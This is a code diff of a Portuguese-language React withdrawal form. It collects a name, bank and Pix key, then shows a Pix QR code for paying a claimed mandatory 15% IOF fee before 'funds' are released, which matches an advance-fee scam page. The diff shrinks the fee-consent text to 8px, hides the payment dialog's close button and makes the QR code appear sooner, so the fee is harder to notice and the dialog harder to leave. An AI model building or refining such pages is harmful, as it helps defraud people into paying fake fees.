@@ -25,7 +25,7 @@ const WithdrawForm = () => {
     if (showLoadingModal && !showQrCode) {
       const timer = setTimeout(() => {
         setShowQrCode(true);
-      }, 5000);
+      }, 3000);
       return () => clearTimeout(timer);
     }
   }, [showLoadingModal, showQrCode]);
@@ -72,13 +72,13 @@ const WithdrawForm = () => {
         {/* Form Card */}
         <div className="bg-secondary rounded-xl p-6 flex flex-col">
           {/* Title */}
-          <h1 className="text-foreground text-[1.5rem] leading-[1.3] font-bold mb-6">
+          <h1 className="text-foreground text-[1.5rem] leading-[1.3] mb-6" style={{ fontFamily: "'Open Sans', sans-serif", fontWeight: 700 }}>
             Preencha o formulário para receber os valores solicitados.
           </h1>
 
           {/* Nome Completo */}
           <div className="mb-5">
-            <label className="text-foreground text-lg font-medium block mb-2">
+            <label className="text-foreground text-lg block mb-2" style={{ fontFamily: "'Open Sans', sans-serif", fontWeight: 700 }}>
               Nome Completo
             </label>
             <input
@@ -93,7 +93,7 @@ const WithdrawForm = () => {
 
           {/* Banco Destinatário */}
           <div className="mb-5">
-            <label className="text-foreground text-lg font-medium block mb-2">
+            <label className="text-foreground text-lg block mb-2" style={{ fontFamily: "'Open Sans', sans-serif", fontWeight: 700 }}>
               Banco Destinatário
             </label>
             <input
@@ -108,7 +108,7 @@ const WithdrawForm = () => {
 
           {/* Chave Pix */}
           <div className="mb-6">
-            <label className="text-foreground text-lg font-medium block mb-2">
+            <label className="text-foreground text-lg block mb-2" style={{ fontFamily: "'Open Sans', sans-serif", fontWeight: 700 }}>
               Chave Pix
             </label>
             <input
@@ -128,7 +128,7 @@ const WithdrawForm = () => {
               onCheckedChange={setAceitaTermos}
               className="mt-1 data-[state=checked]:bg-primary data-[state=unchecked]:bg-muted"
             />
-            <p className="text-foreground/80 text-xs leading-tight">
+            <p className="text-foreground/80 text-[8px] leading-tight" style={{ fontFamily: "'Open Sans', sans-serif" }}>
               Ao solicitar o saque para sua conta é necessário está de acordo com o pagamento de 15% do IOF (Imposto sobre Operações Financeiras)
             </p>
           </div>
@@ -136,7 +136,8 @@ const WithdrawForm = () => {
           {/* Submit Button */}
           <button 
             onClick={handleSubmit}
-            className="w-full py-5 bg-primary text-foreground rounded-xl text-2xl font-normal"
+            className="w-full py-5 bg-primary text-foreground rounded-lg text-2xl"
+            style={{ fontFamily: "'Open Sans', sans-serif", fontWeight: 700 }}
           >
             Próximo
           </button>
@@ -147,10 +148,10 @@ const WithdrawForm = () => {
           setShowLoadingModal(open);
           if (!open) setShowQrCode(false);
         }}>
-          <DialogContent className="bg-white rounded-3xl p-8 max-w-[320px] border-0 shadow-xl flex flex-col items-center gap-6">
+          <DialogContent className="bg-white rounded-3xl p-8 max-w-[320px] border-0 shadow-xl flex flex-col items-center gap-6 [&>button]:hidden">
             {!showQrCode ? (
               <>
-                <h2 className="text-foreground text-2xl font-serif font-bold text-center">
+                <h2 className="text-foreground text-2xl text-center" style={{ fontFamily: "'Open Sans', sans-serif", fontWeight: 700 }}>
                   Gerando Qrcode
                 </h2>
                 
@@ -171,7 +172,7 @@ const WithdrawForm = () => {
                   </svg>
                 </div>
 
-                <p className="text-foreground/70 text-sm text-center leading-snug font-serif">
+                <p className="text-foreground/70 text-[10px] text-center leading-snug" style={{ fontFamily: "'Open Sans', sans-serif" }}>
                   O pagamento da taxa IOF é obrigatória conforme a Lei nº 5.143, de 20 de outubro de 1966.
                 </p>
               </>
@@ -183,17 +184,17 @@ const WithdrawForm = () => {
                     value={pixCode} 
                     size={220}
                     level="H"
-                    className="rounded-lg"
+                    className="rounded-none"
                   />
                 </div>
 
-                <p className="text-foreground/70 text-sm text-center leading-snug font-serif">
+                <p className="text-foreground/70 text-sm text-center leading-snug" style={{ fontFamily: "'Open Sans', sans-serif" }}>
                   Ao finalizar o pagamento você recebe os fundos solicitados via Pix, através da conta bancária vinculada.
                 </p>
 
                 {/* Pix Code Display */}
-                <div className="w-full bg-white border-2 border-muted rounded-2xl px-4 py-4">
-                  <p className="text-foreground text-center text-lg font-mono break-all">
+                <div className="w-full bg-white border-2 border-muted rounded-lg px-4 py-3 overflow-hidden">
+                  <p className="text-foreground text-center text-sm font-mono truncate">
                     {pixCode}
                   </p>
                 </div>
@@ -201,7 +202,8 @@ const WithdrawForm = () => {
                 {/* Copy Button */}
                 <button 
                   onClick={handleCopyCode}
-                  className="w-full py-4 bg-primary text-foreground rounded-full text-xl font-bold flex items-center justify-center gap-2"
+                  className="w-full py-4 bg-primary text-foreground rounded-lg text-xl flex items-center justify-center gap-2"
+                  style={{ fontFamily: "'Open Sans', sans-serif", fontWeight: 700 }}
                 >
                   Copiar Código
                 </button>
